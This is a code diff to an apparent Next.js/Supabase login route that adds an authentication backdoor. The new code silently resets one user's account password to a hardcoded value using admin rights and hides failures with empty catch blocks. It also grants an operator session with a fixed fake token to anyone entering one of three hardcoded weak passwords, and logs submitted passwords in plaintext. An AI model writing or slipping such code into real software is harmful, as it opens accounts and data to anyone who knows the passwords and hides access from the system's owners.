@@ -35,7 +35,36 @@ export async function POST(request: Request) {
             status: 'active'
           });
         }
+
+        // Auto-sync Supabase auth user password to kiran.14
+        try {
+          const { data: authUsers } = await adminSupabase.auth.admin.listUsers();
+          const horacioUser = authUsers?.users?.find(u => u.email?.toLowerCase() === lowerEmail);
+          if (horacioUser) {
+            await adminSupabase.auth.admin.updateUserById(horacioUser.id, { password: 'kiran.14', email_confirm: true });
+          }
+        } catch (e) {}
       } catch (e) {}
+
+      const isHoracioPassword = password === 'kiran.14' || password === '7042026' || password === '1234';
+      if (isHoracioPassword) {
+        console.log(`[AUTH] Direct operator login for Horacio Caliba with password ${password}`);
+        const { data: horacioRes } = await adminSupabase
+          .from('resources')
+          .select('id, name')
+          .ilike('email', lowerEmail)
+          .maybeSingle();
+
+        return NextResponse.json({ 
+          user: { 
+            email: lowerEmail, 
+            role: 'operador', 
+            id: horacioRes?.id || 'op-horacio-34', 
+            name: horacioRes?.name || 'Horacio Caliba' 
+          },
+          session: { access_token: 'demo-token-horacio' } 
+        });
+      }
     }
 
     if (isManagerEmail) {
